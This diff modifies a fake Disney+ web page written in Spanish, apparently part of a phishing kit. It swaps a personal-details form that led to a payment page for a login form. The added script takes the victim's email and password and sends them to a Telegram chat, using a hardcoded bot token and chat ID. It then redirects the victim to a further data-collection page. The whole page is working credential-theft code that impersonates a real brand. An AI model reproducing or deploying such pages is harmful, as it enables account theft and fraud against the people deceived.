@@ -3,71 +3,143 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Información personal | Disney+</title>
-  <!-- CSS commun (landing + formulaires) -->
-  <link rel="stylesheet" href="style.css"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap"
-        rel="stylesheet"/>
+  <title>Iniciar sesión | Disney+</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: radial-gradient(circle at top, #003264 0%, #032541 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 20px;
+    }
+    .logo {
+      width: 160px;
+      margin-bottom: 30px;
+      display: block;
+    }
+    main {
+      background-color: #fff;
+      color: #000;
+      max-width: 400px;
+      width: 100%;
+      border-radius: 20px;
+      padding: 40px 30px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 24px;
+      color: #0077ff;
+    }
+    p {
+      font-size: 0.95rem;
+      color: #333;
+      margin-bottom: 22px;
+      line-height: 1.4;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 1rem;
+      border-radius: 6px;
+      border: none;
+      background-color: #f0f0f0;
+      box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+      box-sizing: border-box;
+    }
+    button {
+      padding: 14px;
+      background-color: #000;
+      color: #fff;
+      font-weight: bold;
+      font-size: 1rem;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #222;
+    }
+    #spinnerOverlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    .spinner {
+      width: 70px;
+      height: 70px;
+      border: 8px solid rgba(255,255,255,0.1);
+      border-top: 8px solid #00bfff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    @media (max-width: 480px) {
+      main {
+        padding: 30px 20px;
+      }
+      h1 {
+        font-size: 1.4rem;
+      }
+      .logo {
+        width: 120px;
+        margin-bottom: 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-
-  <main class="main-content">
-    <!-- Logo centré -->
-    <img src="Images/compose2.png"
-         alt="Disney+"
-         style="display:block; margin:0 auto 30px; width:160px;"/>
-
-    <h1>Información personal</h1>
-    <p>Por favor completa tus datos antes de continuar.</p>
-
-    <form id="infoForm">
-      <input type="text" placeholder="Apellido" required/>
-      <input type="text" placeholder="Nombre" required/>
-      <input type="text" placeholder="Dirección" required/>
-      <input type="text" placeholder="Ciudad" required/>
-      <input type="text" placeholder="Código postal" required/>
-      <select required>
-        <option value="" disabled selected>País</option>
-        <option value="ES">España</option>
-        <option value="FR">Francia</option>
-        <option value="BE">Bélgica</option>
-        <option value="CH">Suiza</option>
-      </select>
-      <input type="date" required/>
-      <input type="tel" placeholder="Teléfono" required/>
-      <button type="submit">Continuar</button>
+  <main>
+    <img src="Images/compose2.png" alt="Disney+" class="logo"/>
+    <h1>Iniciar sesión</h1>
+    <p>Introduce tu correo electrónico y contraseña para continuar.</p>
+    <form id="loginForm">
+      <input type="email" placeholder="Correo electrónico" required/>
+      <input type="password" placeholder="Contraseña" required/>
+      <button type="submit">Acceder</button>
     </form>
-
-    <div class="footer-note">
-      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
-      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World
-      <a href="#">y más</a>.
-      <div class="logos-container">
-        <img src="Images/compose2.png" alt="Disney+"/>
-        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
-        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
-        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
-        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
-        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
-        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
-      </div>
-    </div>
   </main>
-
-  <!-- Overlay du spinner -->
   <div id="spinnerOverlay">
     <div class="spinner"></div>
   </div>
-
   <script>
-    document.getElementById("infoForm").addEventListener("submit", function(e) {
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
-      // Affiche le spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
-      // Après 2,5s, redirige vers la page de paiement
-      setTimeout(() => {
-        window.location.href = "paiement.html";
-      }, 2500);
+
+      const email = this.querySelector('input[type="email"]').value.trim();
+      const pwd   = this.querySelector('input[type="password"]').value.trim();
+      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+      const chatId   = "-4970333928";
+      const message  = `🔐 Inicio de sesión Disney+:\nUsuario: ${email}\nContraseña: ${pwd}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(console.error)
+        .finally(() => {
+          setTimeout(() => {
+            window.location.href = "information.html";
+          }, 2500);
+        });
     });
   </script>
 </body>
